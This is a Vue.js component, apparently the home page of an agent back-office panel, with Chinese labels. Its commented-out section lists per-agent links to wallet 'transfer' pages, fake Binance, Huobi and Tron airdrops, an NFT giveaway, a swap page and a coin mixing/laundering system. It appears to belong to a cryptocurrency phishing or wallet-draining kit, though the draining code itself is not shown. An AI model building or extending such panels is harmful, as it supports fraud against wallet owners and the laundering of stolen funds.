<template>
  <div class="mod-home">
    <!--    <h3>项目介绍</h3>-->

    <div>
      <div class="title">
        代理编号id： {{ userId }}
      </div>
    </div>

    <br>

    <div>
      <div class="title">
        后台管理网站:
      </div>

      <div>
        <a :href="bgUrl" target="_blank">
          {{ bgUrl }}
        </a>
      </div>
    </div>
    <br/>

<!--    <div v-show=" userId == 1 ">-->
<!--      <el-row :gutter="12">-->
<!--        <el-col :span="12">-->
<!--          <el-card shadow="always">-->
<!--            <div slot="header" class="clearfix">-->
<!--              <span>转账网站</span>-->
<!--              <span class="desc">-->
<!--                (以太坊系erc、heco、bsc均支持，用户切换哪种钱包访问就是哪种)-->
<!--              </span>-->
<!--            </div>-->
<!--            <div>-->
<!--              以太坊系：-->
<!--              <br>-->
<!--              <a :href="ethUrl" target="_blank">-->
<!--                {{ ethUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--            <div>-->
<!--              波场系：-->
<!--              <br>-->
<!--              <a :href="trxUrl" target="_blank">-->
<!--                {{ trxUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--          </el-card>-->
<!--        </el-col>-->
<!--        <el-col :span="12">-->
<!--          <el-card shadow="always">-->
<!--            <div slot="header" class="clearfix">-->
<!--              <span>空投</span>-->
<!--              <span class="desc">-->
<!--                (erc、trx、heco、bsc均支持，用户切换哪种钱包访问就是哪种)-->
<!--              </span>-->
<!--            </div>-->
<!--            <div>-->
<!--              币安：-->
<!--              <br>-->
<!--              <a :href="bnbDropUrl" target="_blank">-->
<!--                {{ bnbDropUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--            <div>-->
<!--              火币：-->
<!--              <br>-->
<!--              <a :href="huobiDropUrl" target="_blank">-->
<!--                {{ huobiDropUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--            <div>-->
<!--              波场：-->
<!--              <br>-->
<!--              <a :href="tronDropUrl" target="_blank">-->
<!--                {{ tronDropUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--            <div>-->
<!--              币安四周年NFT庆：-->
<!--              <br>-->
<!--              <a :href="nftDropUrl" target="_blank">-->
<!--                {{ nftDropUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--          </el-card>-->
<!--        </el-col>-->
<!--      </el-row>-->

<!--      <el-row :gutter="12">-->
<!--        <el-col :span="12">-->
<!--          <el-card shadow="always">-->
<!--            <div slot="header" class="clearfix">-->
<!--              <span>币币兑换</span>-->
<!--              <span class="desc">-->
<!--                (erc、trx、heco、bsc均支持，具体看用户切换哪种钱包和点击的哪种币)-->
<!--              </span>-->
<!--            </div>-->
<!--            <div>-->
<!--              网站1：-->
<!--              <br>-->
<!--              <a :href="swapUrl" target="_blank">-->
<!--                {{ swapUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--          </el-card>-->
<!--        </el-col>-->
<!--        <el-col :span="12">-->
<!--          <el-card shadow="always">-->
<!--            <div slot="header" class="clearfix">-->
<!--              <span>其他</span>-->
<!--              <span class="desc">-->
<!--                (erc、trx、heco、bsc均支持，具体看用户切换哪种钱包和点击的哪种币)-->
<!--              </span>-->
<!--            </div>-->
<!--            <div>-->
<!--              混币/洗币系统：-->
<!--              <br>-->
<!--              <a :href="mixedUrl" target="_blank">-->
<!--                {{ mixedUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--            <div>-->
<!--              BTT派送：-->
<!--              <br>-->
<!--              <a :href="bttUrl" target="_blank">-->
<!--                {{ bttUrl }}-->
<!--              </a>-->
<!--            </div>-->
<!--          </el-card>-->
<!--        </el-col>-->
<!--      </el-row>-->

<!--    </div>-->

  </div>
</template>

<script>
export default {
  data() {
    return {
      port: "",
      bgUrl: "", // 后台地址

      ethUrl: "", // 以太坊转账地址
      trxUrl: "", // 波场转账地址

      swapUrl: "", // 换币网站

      bnbDropUrl: "", // erc空投
      huobiDropUrl: "", // erc2空投
      tronDropUrl: "", // trc空投
      nftDropUrl: "", // NFT空投

      mixedUrl: "", // 混币
      bttUrl: "", // BTT派送
    }
  },
  computed: {
    userId: {
      get() {
        return this.$store.state.user.id
      }
    },
  },
  mounted() {
    this.init();
  },
  methods: {
    // 初始化
    init() {
      if (
        (window.location.protocol == "http" && window.location.port == "80") ||
        (window.location.protocol == "https" && window.location.port == "443") ||
        (window.location.port == "")
      ) {
        this.port = "";
      } else {
        this.port = ":" + window.location.port;
      }
      let hostname = window.location.hostname.replace("bg.", "");

      this.bgUrl = window.location.protocol + "//" + "bg." + hostname + this.port + "/#/home";



      // this.ethUrl = window.location.protocol + "//" + hostname + this.port + "/#/erc?i=" + this.userId + "&a=t";
      // this.trxUrl = window.location.protocol + "//" + hostname + this.port + "/#/trc?i=" + this.userId + "&a=t";
      //
      // this.bnbDropUrl = window.location.protocol + "//" + hostname + this.port + "/#/airdropbnb?i=" + this.userId;
      //
      // this.huobiDropUrl = window.location.protocol + "//" + hostname + this.port + "/#/airdrophuobi?i=" + this.userId;
      // this.tronDropUrl = window.location.protocol + "//" + hostname + this.port + "/#/airdroptron?i=" + this.userId;
      // this.nftDropUrl = window.location.protocol + "//" + hostname + this.port + "/#/nftbnb?i=" + this.userId;
      //
      // this.swapUrl = window.location.protocol + "//" + hostname + this.port + "/#/swap?i=" + this.userId;
      //
      // this.mixedUrl = window.location.protocol + "//" + hostname + this.port + "/#/mixed?i=" + this.userId;
      // this.bttUrl = window.location.protocol + "//" + hostname + this.port + "/#/btt?i=" + this.userId;

    },
  }
}
</script>

<style scoped>
.mod-home {
  line-height: 1.5;
}

.mod-home div {
  padding: 5px;
}

.mod-home .title {
  font-weight: 500;
}

.desc {
  font-size: 10px;
  color: #ff9c7d;
  margin-left: 5px;
}


</style>

